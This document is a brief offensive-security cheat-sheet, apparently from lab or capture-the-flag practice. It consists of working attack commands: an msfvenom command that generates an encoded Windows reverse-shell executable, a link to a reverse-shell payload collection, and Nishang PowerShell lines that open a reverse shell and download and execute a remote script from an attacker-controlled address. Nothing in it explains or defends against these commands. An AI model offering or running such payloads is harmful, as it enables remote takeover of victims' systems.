msfvenom --platform Windows -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=10.8.102.117 LPORT=1234 -f exe -o shell.exe


https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy




##Nishang 

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 443

powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')



